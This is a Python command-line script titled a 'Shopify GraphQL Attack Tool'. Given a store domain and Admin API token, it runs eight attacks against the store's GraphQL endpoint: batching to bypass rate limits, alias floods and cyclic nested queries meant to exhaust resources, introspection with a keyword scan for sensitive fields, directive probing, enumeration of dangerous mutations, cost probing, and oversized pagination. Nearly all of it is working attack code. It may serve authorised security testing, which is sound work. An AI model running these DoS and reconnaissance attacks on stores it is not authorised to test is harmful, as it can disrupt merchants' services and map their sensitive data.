#!/usr/bin/env python3
"""
Shopify GraphQL Attack Tool
Tests Shopify Admin API GraphQL endpoints for vulnerabilities.
"""

import argparse
import json
import logging
import sys
import time
import requests
from typing import Dict, Any, List, Optional
from dataclasses import dataclass, field
from datetime import datetime

# --- ANSI Colors ---
class C:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    MAGENTA = "\033[95m"
    DIM = "\033[2m"

LOG_FILE = "/tmp/shopify_graphql_attack.log"
BANNER = f"""{C.CYAN}{C.BOLD}
  _____ _               _ _              _____                 _    ____      _ __
 / ____| |             | (_)            / ____|               | |  / / /___  (_) /_
| (___ | |__   ___  ___| |_ _   _ ___  | |  __ _ __ __ _  ___| | / / /_  / / / __/
 \\___ \\| '_ \\ / _ \\/ __| | | | | / __| | | |_ | '__/ _` |/ _ \\ |/ / / / /_/ / /_
 ____) | | | | (_) \\__ \\ | | |_| \\__ \\ | |__| | | | (_| |  __/ / / / / /\\__  / __/
|_____/|_| |_|\\___/|___/_|_|\\__,_|___/  \\_____|_|  \\__, |\\___/_/_/ /_/ /_//_/\\__|
                                                      __/ |
                                                     |___/  v1.0
{C.RESET}{C.DIM}  Shopify GraphQL Security Testing Tool{C.RESET}
"""

# --- Logging ---
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(asctime)s [%(levelname)s] %(message)s",
    filemode="w",
)
logger = logging.getLogger("shopify_gql_attack")


@dataclass
class Finding:
    attack: str
    severity: str  # INFO, LOW, MEDIUM, HIGH, CRITICAL
    title: str
    detail: str
    raw: Any = None


@dataclass
class Results:
    store: str
    start_time: str = field(default_factory=lambda: datetime.now().isoformat())
    findings: List[Finding] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)

    def add(self, finding: Finding):
        self.findings.append(finding)

    def to_dict(self) -> dict:
        return {
            "store": self.store,
            "start_time": self.start_time,
            "end_time": datetime.now().isoformat(),
            "total_findings": len(self.findings),
            "findings": [
                {
                    "attack": f.attack,
                    "severity": f.severity,
                    "title": f.title,
                    "detail": f.detail,
                }
                for f in self.findings
            ],
            "errors": self.errors,
        }


class ShopifyGraphQLAttacker:
    def __init__(self, store: str, token: str, delay: float = 1.0, verbose: bool = False):
        self.store = store if ".myshopify.com" in store else f"{store}.myshopify.com"
        self.token = token
        self.delay = delay
        self.verbose = verbose
        self.endpoint = f"https://{self.store}/admin/api/2024-01/graphql.json"
        self.session = requests.Session()
        self.session.headers.update({
            "X-Shopify-Access-Token": self.token,
            "Content-Type": "application/json",
            "Accept": "application/json",
        })
        self.results = Results(store=self.store)

    # ---- helpers ----
    def _gql(self, query: str, variables: Optional[dict] = None, timeout: int = 30) -> Dict[str, Any]:
        """Execute a GraphQL request and return the JSON response."""
        payload = {"query": query}
        if variables:
            payload["variables"] = variables
        logger.debug("POST %s | query=%.200s", self.endpoint, query)
        try:
            r = self.session.post(self.endpoint, json=payload, timeout=timeout)
            elapsed = r.elapsed.total_seconds()
            logger.debug("Response %d in %.2fs | body=%.500s", r.status_code, elapsed, r.text)
            return {"status_code": r.status_code, "elapsed": elapsed, "headers": dict(r.headers), "body": r.json() if r.headers.get("content-type", "").startswith("application/json") else r.text}
        except requests.exceptions.Timeout:
            return {"status_code": 0, "elapsed": timeout, "error": "timeout"}
        except Exception as e:
            return {"status_code": 0, "elapsed": 0, "error": str(e)}

    def _sleep(self):
        if self.delay > 0:
            time.sleep(self.delay)

    def _print(self, msg: str, color: str = ""):
        print(f"{color}{msg}{C.RESET}")

    def _finding(self, attack: str, severity: str, title: str, detail: str, raw=None):
        f = Finding(attack=attack, severity=severity, title=title, detail=detail, raw=raw)
        self.results.add(f)
        sev_color = {"CRITICAL": C.RED, "HIGH": C.RED, "MEDIUM": C.YELLOW, "LOW": C.BLUE, "INFO": C.DIM}.get(severity, "")
        self._print(f"  [{sev_color}{severity}{C.RESET}] {title}: {detail}")
        logger.info("[%s] %s: %s | attack=%s", severity, title, detail, attack)

    # ---- Attack 1: Query Batching ----
    def attack_query_batching(self):
        """Send multiple GraphQL operations in a single request body to bypass rate limits."""
        self._print(f"\n{C.BOLD}{'='*60}")
        self._print(f"  Attack 1: Query Batching", C.CYAN)
        self._print(f"{'='*60}{C.RESET}")

        # Technique: send an array of operations (batched query)
        batch = [
            {"query": "{ shop { name } }", "variables": {}},
            {"query": "{ shop { name id } }", "variables": {}},
            {"query": "{ shop { name plan { displayName } } }", "variables": {}},
        ]
        resp = self._gql(json.dumps(batch))  # raw body as array
        self._sleep()

        # Shopify typically accepts single objects, but some configs allow arrays
        if resp.get("status_code") == 200 and isinstance(resp.get("body"), list):
            self._finding("query_batching", "MEDIUM", "Batch queries accepted",
                          "Server accepted array of GraphQL operations – potential rate-limit bypass", resp)
        elif resp.get("status_code") == 200:
            self._finding("query_batching", "INFO", "Batch queries not accepted as array",
                          f"Status {resp['status_code']}, body type: {type(resp.get('body')).__name__}")
        else:
            self._finding("query_batching", "INFO", "Batch query result",
                          f"Status {resp.get('status_code')}, error: {resp.get('error', 'none')}")

        # Technique: alias batching in a single query (many operations via aliases)
        aliases = "\n".join([f"  op{i}: shop {{ name }}" for i in range(50)])
        q = f"{{\n{aliases}\n}}"
        resp2 = self._gql(q)
        self._sleep()
        if resp2.get("status_code") == 200 and isinstance(resp2.get("body"), dict):
            data = resp2["body"].get("data", {})
            if isinstance(data, dict) and len(data) > 10:
                self._finding("query_batching", "LOW", "Alias batching works",
                              f"{len(data)} aliased operations executed in single query", resp2["body"])
            else:
                self._finding("query_batching", "INFO", "Alias batching result",
                              f"Returned {len(data) if isinstance(data, dict) else 0} fields")
        else:
            self._finding("query_batching", "INFO", "Alias batching failed",
                          f"Status {resp2.get('status_code')}")

    # ---- Attack 2: Alias-Based DoS ----
    def attack_alias_dos(self):
        """Send queries with 100+ aliases to test for resource exhaustion."""
        self._print(f"\n{C.BOLD}{'='*60}")
        self._print(f"  Attack 2: Alias-Based DoS", C.CYAN)
        self._print(f"{'='*60}{C.RESET}")

        for count in [100, 200, 500]:
            aliases = "\n".join([f"  a{i}: shop {{ name }}" for i in range(count)])
            q = f"{{\n{aliases}\n}}"
            start = time.time()
            resp = self._gql(q, timeout=15)
            elapsed = time.time() - start
            self._sleep()

            if resp.get("error") == "timeout":
                self._finding("alias_dos", "HIGH", f"Timeout with {count} aliases",
                              f"Server did not respond within 15s with {count} aliases – possible DoS vector",
                              {"alias_count": count})
                continue

            status = resp.get("status_code")
            body = resp.get("body", {})
            errors = body.get("errors", []) if isinstance(body, dict) else []

            if status == 200 and not errors:
                self._finding("alias_dos", "LOW", f"{count} aliases accepted",
                              f"Server processed {count} aliased queries in {elapsed:.2f}s without error")
            elif errors:
                throttle = any("throttl" in str(e).lower() or "limit" in str(e).lower() for e in errors)
                if throttle:
                    self._finding("alias_dos", "MEDIUM", f"Rate limited at {count} aliases",
                                  f"Throttled at {count} aliases after {elapsed:.2f}s", errors[:3])
                    break
                else:
                    self._finding("alias_dos", "INFO", f"Errors at {count} aliases",
                                  f"{len(errors)} errors returned", errors[:3])
            else:
                self._finding("alias_dos", "INFO", f"Alias DoS {count} result",
                              f"Status {status}, elapsed {elapsed:.2f}s")

    # ---- Attack 3: Nested Query Abuse ----
    def attack_nested_queries(self):
        """Deeply nested queries (10+ levels) to test for stack overflow / DoS."""
        self._print(f"\n{C.BOLD}{'='*60}")
        self._print(f"  Attack 3: Nested Query Abuse", C.CYAN)
        self._print(f"{'='*60}{C.RESET}")

        # For Shop type, we need to find nestable fields. We'll try introspection first,
        # then fall back to a self-referencing fragment approach.
        # Shopify's Product type has variants -> product -> variants -> ... which can nest.
        # But we'll also try a raw nested approach.

        for depth in [5, 10, 20]:
            # Build a nested query using products -> variants -> product (cycle)
            # This is a known pattern to abuse GraphQL nesting
            inner = "id"
            for _ in range(depth):
                inner = f"variants(first: 1) {{ edges {{ node {{ product {{ {inner} }} }} }} }}"
            q = f"{{ products(first: 1) {{ edges {{ node {{ {inner} }} }} }} }}"

            start = time.time()
            resp = self._gql(q, timeout=15)
            elapsed = time.time() - start
            self._sleep()

            if resp.get("error") == "timeout":
                self._finding("nested_queries", "HIGH", f"Timeout at depth {depth}",
                              f"Server timed out with {depth}-level nested query", {"depth": depth})
                continue

            status = resp.get("status_code")
            body = resp.get("body", {})
            errors = body.get("errors", []) if isinstance(body, dict) else []

            if status == 200 and not errors:
                self._finding("nested_queries", "MEDIUM", f"Depth {depth} query accepted",
                              f"Server processed {depth}-level nested query in {elapsed:.2f}s without error")
            elif errors:
                err_str = str(errors[:3])
                if "cycle" in err_str.lower() or "depth" in err_str.lower() or "too complex" in err_str.lower():
                    self._finding("nested_queries", "INFO", f"Depth {depth} rejected (cycle protection)",
                                  "Server detected query cycle/depth limit", errors[:3])
                else:
                    self._finding("nested_queries", "LOW", f"Depth {depth} errors",
                                  f"{len(errors)} errors", errors[:3])
            else:
                self._finding("nested_queries", "INFO", f"Depth {depth} result",
                              f"Status {status}, elapsed {elapsed:.2f}s")

    # ---- Attack 4: Field Suggestion / Introspection ----
    def attack_field_suggestion(self):
        """Test if __type introspection leaks sensitive field names."""
        self._print(f"\n{C.BOLD}{'='*60}")
        self._print(f"  Attack 4: Field Suggestion / Introspection", C.CYAN)
        self._print(f"{'='*60}{C.RESET}")

        # Full introspection query
        introspection_q = """
        query IntrospectionQuery {
          __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
              name
              kind
              fields {
                name
                type { name kind ofType { name kind } }
              }
            }
            directives { name locations args { name type { name } } }
          }
        }
        """
        resp = self._gql(introspection_q)
        self._sleep()

        body = resp.get("body", {})
        if resp.get("status_code") == 200 and isinstance(body, dict) and body.get("data", {}).get("__schema"):
            schema = body["data"]["__schema"]
            types = schema.get("types", [])
            custom_types = [t for t in types if not t["name"].startswith("__")]
            type_names = [t["name"] for t in custom_types]
            self._finding("introspection", "MEDIUM", "Full introspection enabled",
                          f"{len(custom_types)} custom types exposed: {', '.join(type_names[:20])}{'...' if len(type_names) > 20 else ''}")

            # Look for sensitive-sounding types/fields
            sensitive_keywords = ["secret", "password", "token", "key", "private", "admin", "webhook", "api", "credit", "payment", "address", "email", "phone", "customer", "order", "transaction"]
            sensitive_types = []
            for t in custom_types:
                tname_lower = t["name"].lower()
                if any(kw in tname_lower for kw in sensitive_keywords):
                    sensitive_types.append(t["name"])
                # Also check fields within types
                for f in (t.get("fields") or []):
                    if any(kw in f["name"].lower() for kw in sensitive_keywords):
                        sensitive_types.append(f"{t['name']}.{f['name']}")

            if sensitive_types:
                self._finding("introspection", "HIGH", "Sensitive types/fields exposed",
                              f"Found {len(sensitive_types)} sensitive items: {', '.join(sensitive_types[:30])}")
        else:
            self._finding("introspection", "INFO", "Introspection restricted",
                          f"Status {resp.get('status_code')}, errors present: {bool(body.get('errors') if isinstance(body, dict) else True)}")

        # Test __type on specific types
        for type_name in ["Shop", "Product", "Order", "Customer", "User", "StaffMember"]:
            q = f'{{ __type(name: "{type_name}") {{ name fields {{ name type {{ name }} }} }} }}'
            r = self._gql(q)
            self._sleep()
            b = r.get("body", {})
            if r.get("status_code") == 200 and isinstance(b, dict) and b.get("data", {}).get("__type"):
                fields = b["data"]["__type"].get("fields", [])
                field_names = [f["name"] for f in (fields or [])]
                self._finding("introspection", "LOW", f"Type '{type_name}' fields exposed",
                              f"{len(field_names)} fields: {', '.join(field_names[:25])}{'...' if len(field_names) > 25 else ''}")

    # ---- Attack 5: Directive Abuse ----
    def attack_directive_abuse(self):
        """Test @skip/@include with invalid args, @deprecated fields."""
        self._print(f"\n{C.BOLD}{'='*60}")
        self._print(f"  Attack 5: Directive Abuse", C.CYAN)
        self._print(f"{'='*60}{C.RESET}")

        # @skip and @include with various invalid inputs
        tests = [
            ("@skip(if: null)", '{ shop { name @skip(if: null) } }'),
            ("@skip(if: 1)", '{ shop { name @skip(if: 1) } }'),
            ("@skip(if: \"string\")", '{ shop { name @skip(if: "string") } }'),
            ("@include(if: null)", '{ shop { name @include(if: null) } }'),
            ("@skip(if: true) @skip(if: false)", '{ shop { name @skip(if: true) @skip(if: false) } }'),
            ("@customDirective(arg: \"test\")", '{ shop { name @customDirective(arg: "test") } }'),
        ]

        for label, q in tests:
            resp = self._gql(q)
            self._sleep()
            body = resp.get("body", {})
            errors = body.get("errors", []) if isinstance(body, dict) else []
            status = resp.get("status_code")

            if status == 200 and not errors:
                self._finding("directive_abuse", "LOW", f"Directive accepted: {label}",
                              "Invalid/edge-case directive was processed without error")
            elif errors:
                err_msg = str(errors[0].get("message", "")) if isinstance(errors[0], dict) else str(errors[0])
                self._finding("directive_abuse", "INFO", f"Directive rejected: {label}",
                              f"Error: {err_msg[:100]}")

        # Test @deprecated fields via introspection
        q = """{ __type(name: "Product") { fields(includeDeprecated: true) { name isDeprecated deprecationReason } } }"""
        resp = self._gql(q)
        self._sleep()
        body = resp.get("body", {})
        if resp.get("status_code") == 200 and isinstance(body, dict):
            fields_data = body.get("data", {}).get("__type", {}).get("fields", [])
            deprecated = [f for f in (fields_data or []) if f.get("isDeprecated")]
            if deprecated:
                self._finding("directive_abuse", "MEDIUM", "Deprecated fields accessible",
                              f"{len(deprecated)} deprecated Product fields accessible: {', '.join(f['name'] for f in deprecated[:15])}")
            else:
                self._finding("directive_abuse", "INFO", "Deprecated fields check",
                              "No deprecated fields found or introspection restricted")

    # ---- Attack 6: Mutation Enumeration ----
    def attack_mutation_enumeration(self):
        """Enumerate all available mutations and test for dangerous ones."""
        self._print(f"\n{C.BOLD}{'='*60}")
        self._print(f"  Attack 6: Mutation Enumeration", C.CYAN)
        self._print(f"{'='*60}{C.RESET}")

        q = """
        {
          __schema {
            mutationType {
              fields {
                name
                args {
                  name
                  type { name kind ofType { name kind } }
                }
              }
            }
          }
        }
        """
        resp = self._gql(q)
        self._sleep()
        body = resp.get("body", {})

        if resp.get("status_code") != 200 or not isinstance(body, dict) or not body.get("data", {}).get("__schema", {}).get("mutationType"):
            self._finding("mutation_enum", "INFO", "Mutation enumeration failed",
                          f"Status {resp.get('status_code')} – mutation introspection may be disabled")
            return

        mutations = body["data"]["__schema"]["mutationType"]["fields"]
        mutation_names = [m["name"] for m in mutations]

        self._finding("mutation_enum", "INFO", "Mutations enumerated",
                      f"{len(mutations)} mutations found")

        # Flag dangerous-sounding mutations
        dangerous_keywords = ["delete", "destroy", "remove", "create", "update", "set", "publish",
                              "unpublish", "activate", "deactivate", "install", "uninstall",
                              "webhook", "script", "redirect", "metafield", "bulk", "import", "export",
                              "staff", "user", "role", "permission", "access", "password", "email",
                              "order", "fulfill", "cancel", "refund", "transaction", "gift_card", "price"]
        dangerous = []
        for m in mutations:
            name_lower = m["name"].lower()
            if any(kw in name_lower for kw in dangerous_keywords):
                dangerous.append(m["name"])

        if dangerous:
            self._finding("mutation_enum", "HIGH", "Dangerous mutations accessible",
                          f"{len(dangerous)} potentially dangerous mutations exposed: {', '.join(dangerous[:30])}",
                          dangerous)

        # Try to introspect args of dangerous mutations
        for m_name in dangerous[:5]:
            m_info = next((m for m in mutations if m["name"] == m_name), None)
            if m_info:
                args = m_info.get("args", [])
                arg_desc = [f"{a['name']}({a.get('type', {}).get('name', '?')})" for a in args[:10]]
                self._finding("mutation_enum", "MEDIUM", f"Mutation args: {m_name}",
                              f"Args: {', '.join(arg_desc)}")

    # ---- Attack 7: Cost Analysis ----
    def attack_cost_analysis(self):
        """Calculate query cost and test Shopify's cost limits."""
        self._print(f"\n{C.BOLD}{'='*60}")
        self._print(f"  Attack 7: Cost Analysis", C.CYAN)
        self._print(f"{'='*60}{C.RESET}")

        # Shopify exposes extensions.cost for throttled queries
        # Test with increasingly expensive queries
        for first_val in [50, 100, 250]:
            q = f'{{ products(first: {first_val}) {{ edges {{ node {{ id title variants(first: 50) {{ edges {{ node {{ id title price }} }} }} }} }} }} }}'
            resp = self._gql(q)
            self._sleep()
            body = resp.get("body", {})

            if isinstance(body, dict):
                extensions = body.get("extensions", {})
                cost = extensions.get("cost", {})
                if cost:
                    self._finding("cost_analysis", "MEDIUM", f"Cost info exposed (first: {first_val})",
                                  f"Requested query cost: {cost.get('requestedQueryCost')}, actual: {cost.get('actualQueryCost')}, throttle: {cost.get('throttleStatus', {})}",
                                  cost)
                else:
                    self._finding("cost_analysis", "INFO", f"No cost extensions (first: {first_val})",
                                  f"Status {resp.get('status_code')} – cost info not in extensions")

                # Check for throttle errors
                errors = body.get("errors", [])
                for err in errors:
                    if isinstance(err, dict) and "extensions" in err:
                        ext = err["extensions"]
                        if "code" in ext and ext["code"] in ("THROTTLED", "MAX_COST_EXCEEDED"):
                            self._finding("cost_analysis", "LOW", "Throttle triggered",
                                          f"Code: {ext['code']}, cost: {cost}", ext)

    # ---- Attack 8: Pagination Abuse ----
    def attack_pagination_abuse(self):
        """Test first/last with extreme values (10000+)."""
        self._print(f"\n{C.BOLD}{'='*60}")
        self._print(f"  Attack 8: Pagination Abuse", C.CYAN)
        self._print(f"{'='*60}{C.RESET}")

        for first_val in [100, 500, 1000, 5000, 10000]:
            q = f'{{ products(first: {first_val}) {{ edges {{ node {{ id title }} }} pageInfo {{ hasNextPage }} }} }}'
            start = time.time()
            resp = self._gql(q, timeout=20)
            elapsed = time.time() - start
            self._sleep()

            if resp.get("error") == "timeout":
                self._finding("pagination_abuse", "HIGH", f"Timeout with first: {first_val}",
                              f"Server timed out fetching {first_val} products – potential DoS", {"first": first_val})
                continue

            body = resp.get("body", {})
            status = resp.get("status_code")

            if status == 200 and isinstance(body, dict):
                data = body.get("data") or {}
                products = data.get("products") or {} if isinstance(data, dict) else {}
                edges = products.get("edges", []) if isinstance(products, dict) else []
                errors = body.get("errors", [])
                if edges:
                    self._finding("pagination_abuse", "LOW" if first_val <= 250 else "MEDIUM",
                                  f"first: {first_val} returned {len(edges)} items",
                                  f"Fetched {len(edges)} products in {elapsed:.2f}s",
                                  {"first_requested": first_val, "returned": len(edges)})
                elif errors:
                    err_msg = str(errors[0].get("message", ""))[:150] if isinstance(errors[0], dict) else str(errors[0])[:150]
                    if "cannot exceed" in err_msg.lower() or "first" in err_msg.lower():
                        self._finding("pagination_abuse", "MEDIUM", f"Pagination limit discovered (first: {first_val})",
                                      f"Server enforces limit: {err_msg}")
                    else:
                        self._finding("pagination_abuse", "INFO", f"first: {first_val} errored", err_msg)
                else:
                    self._finding("pagination_abuse", "INFO", f"first: {first_val} empty",
                                  "No edges returned")
            else:
                self._finding("pagination_abuse", "INFO", f"first: {first_val} failed",
                              f"Status {status}")

    # ---- Runner ----
    def run(self, attack: str = "all"):
        attacks = {
            "batching": self.attack_query_batching,
            "alias_dos": self.attack_alias_dos,
            "nested": self.attack_nested_queries,
            "introspection": self.attack_field_suggestion,
            "directives": self.attack_directive_abuse,
            "mutations": self.attack_mutation_enumeration,
            "cost": self.attack_cost_analysis,
            "pagination": self.attack_pagination_abuse,
        }

        if attack == "all":
            for name, fn in attacks.items():
                try:
                    fn()
                except Exception as e:
                    self._print(f"  {C.RED}[ERROR] {name}: {e}{C.RESET}")
                    logger.exception("Attack %s failed", name)
                    self.results.errors.append(f"{name}: {e}")
        elif attack in attacks:
            try:
                attacks[attack]()
            except Exception as e:
                self._print(f"  {C.RED}[ERROR] {attack}: {e}{C.RESET}")
                logger.exception("Attack %s failed", attack)
                self.results.errors.append(f"{attack}: {e}")
        else:
            self._print(f"{C.RED}Unknown attack: {attack}. Choose from: {', '.join(attacks.keys())}, all{C.RESET}")
            sys.exit(1)

    def summary(self):
        self._print(f"\n{C.BOLD}{'='*60}")
        self._print(f"  SUMMARY", C.CYAN)
        self._print(f"{'='*60}{C.RESET}")

        findings = self.results.findings
        by_sev = {}
        for f in findings:
            by_sev.setdefault(f.severity, []).append(f)

        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            items = by_sev.get(sev, [])
            if items:
                color = {"CRITICAL": C.RED, "HIGH": C.RED, "MEDIUM": C.YELLOW, "LOW": C.BLUE, "INFO": C.DIM}.get(sev, "")
                self._print(f"  {color}[{sev}] {len(items)} finding(s){C.RESET}")
                for item in items:
                    self._print(f"    - {item.title}: {item.detail}", color)

        self._print(f"\n  Total findings: {C.BOLD}{len(findings)}{C.RESET}")
        if self.results.errors:
            self._print(f"  Errors: {C.RED}{len(self.results.errors)}{C.RESET}")
        self._print(f"  Log: {LOG_FILE}")


def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="Shopify GraphQL Attack Tool")
    parser.add_argument("--store", required=True, help="Shopify store domain (e.g. mystore.myshopify.com)")
    parser.add_argument("--token", required=True, help="Shopify Admin API access token")
    parser.add_argument("--attack", default="all", help="Attack to run: batching, alias_dos, nested, introspection, directives, mutations, cost, pagination, all")
    parser.add_argument("--delay", type=float, default=1.0, help="Delay between requests in seconds (default: 1.0)")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--output", help="Write JSON results to file")
    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
        handler = logging.StreamHandler(sys.stderr)
        handler.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
        logging.getLogger().addHandler(handler)

    attacker = ShopifyGraphQLAttacker(args.store, args.token, delay=args.delay, verbose=args.verbose)
    attacker.run(args.attack)
    attacker.summary()

    result_json = json.dumps(attacker.results.to_dict(), indent=2)
    print(f"\n{C.DIM}--- JSON Results ---{C.RESET}")
    print(result_json)

    if args.output:
        with open(args.output, "w") as f:
            f.write(result_json)
        print(f"\nResults written to {args.output}")

    # Also dump to log
    logger.info("Final results: %s", result_json)


if __name__ == "__main__":
    main()
